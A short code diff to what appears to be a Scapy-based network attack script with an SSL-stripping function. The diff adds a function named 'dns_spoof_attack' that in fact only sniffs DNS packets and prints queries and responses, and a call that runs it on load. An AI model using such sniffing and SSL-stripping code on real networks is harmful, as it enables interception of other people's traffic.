@@ -43,6 +43,14 @@ def ssl_strip(packet):
 
             send(packet, verbose=0)
 
+def dns_spoof_attack():
+    packets = sniff(filter='udp port 53', count=10)
+    for packet in packets:
+        if packet.haslayer(DNS):
+            dns_packet = packet[DNS]
+            print("DNS Query: ", dns_packet.qd.qname)
+            print("DNS Response: ", dns_packet.an.rdata)
+
 def ssl_strip_attack():
     # prn = function to apply to each sniffed packet
     sniff(filter="tcp and port 80", prn=ssl_strip)
@@ -77,5 +85,5 @@ if __name__ == "__main__":
     else:
         print("Input error!")
 
-
+dns_spoof_attack()
         
